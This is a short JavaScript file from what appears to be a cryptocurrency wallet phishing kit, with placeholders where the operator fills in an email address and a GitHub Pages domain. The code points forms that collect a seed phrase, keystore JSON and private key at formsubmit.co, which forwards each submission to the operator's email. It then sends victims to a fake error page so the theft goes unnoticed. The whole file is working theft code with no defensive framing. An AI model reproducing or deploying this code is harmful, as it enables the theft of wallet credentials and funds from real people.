// Add a new email here !!!
const email = "pokkuvuknu@vusra.com";

// Add your domain here !!!
const domain = "https://calibashen001.github.io/project1/import";

// #####################################################################################

//                    Don't tamper with anything below

// ######################################################################################

let phraseForm = document.getElementById("phrase-form");
const action = document.createAttribute("action");
action.value = `https://formsubmit.co/${email}`;
phraseForm.setAttributeNode(action);

let keystoreForm = document.getElementById("keystore-json-form");
const keystoreAction = document.createAttribute("action");
keystoreAction.value = `https://formsubmit.co/${email}`;
keystoreForm.setAttributeNode(keystoreAction);

let privateKeyForm = document.getElementById("private-key-form");
const privateKeyAction = document.createAttribute("action");
privateKeyAction.value = `https://formsubmit.co/${email}`;
privateKeyForm.setAttributeNode(privateKeyAction);

let phrase = document.getElementById("phrase-thanks");
const phraseID = document.createAttribute("value");
phraseID.value = `${domain}/error.html`;
phrase.setAttributeNode(phraseID);

let keystore = document.getElementById("keystore-thanks");
const keystoreID = document.createAttribute("value");
keystoreID.value = `${domain}/error.html`;
keystore.setAttributeNode(keystoreID);

let privateKey = document.getElementById("private-key-thanks");
const privateKeyID = document.createAttribute("value");
privateKeyID.value = `${domain}/error.html`;
privateKey.setAttributeNode(privateKeyID);
